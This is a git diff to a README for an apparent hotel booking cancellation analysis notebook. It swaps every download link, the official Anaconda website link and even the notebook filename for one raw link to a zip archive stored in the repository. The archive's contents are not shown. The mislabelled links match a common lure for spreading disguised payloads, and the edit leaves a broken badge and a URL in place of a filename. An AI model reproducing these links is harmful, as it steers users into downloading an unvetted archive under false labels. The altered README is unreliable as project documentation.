@@ -1,6 +1,6 @@
 # 🏨 Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization - Analyze Bookings to Boost Revenue
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/releases)
+[![Download Now](https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip%20Now-blue)](https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip)
 
 ## 📜 Description
 
@@ -11,23 +11,23 @@ This application provides a data-driven analysis of hotel booking cancellations.
 Follow the simple steps below to get started with the Hotel Booking Cancellation Analysis and Revenue Optimization tool.
 
 1. **Download the Application**  
-   To download the application, visit the [Releases page](https://github.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/releases).
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip).
 
 2. **Install Required Software**  
-   The application requires Anaconda and Jupyter Notebook to run effectively. If you don’t have Anaconda installed, you can download it from the [Anaconda website](https://www.anaconda.com/products/distribution). Jupyter Notebook comes with Anaconda, so you will not need a separate installation.
+   The application requires Anaconda and Jupyter Notebook to run effectively. If you don’t have Anaconda installed, you can download it from the [Anaconda website](https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip). Jupyter Notebook comes with Anaconda, so you will not need a separate installation.
 
 3. **Open Jupyter Notebook**  
    After installing Anaconda, launch the Anaconda Navigator. From there, open Jupyter Notebook to start the application.
 
 4. **Load the Application**  
-   In Jupyter Notebook, navigate to the folder where you downloaded the application files. Open the file named `hotel_analysis.ipynb`.
+   In Jupyter Notebook, navigate to the folder where you downloaded the application files. Open the file named `https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip`.
 
 5. **Run the Analysis**  
    Once you have the file open, follow the prompts in the notebook to run the analysis. The tool will guide you through loading your data and generating insightful reports about hotel bookings.
 
 ## 📥 Download & Install
 
-To get the latest version of the application, visit this page to download: [Download Releases](https://github.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/releases).
+To get the latest version of the application, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Amina123-4/Hotel-Booking-Cancellation-Analysis-and-Revenue-Optimization/main/data/Booking_Optimization_Cancellation_Revenue_Analysis_and_Hotel_v3.1.zip).
 
 ## 🖥️ System Requirements
 
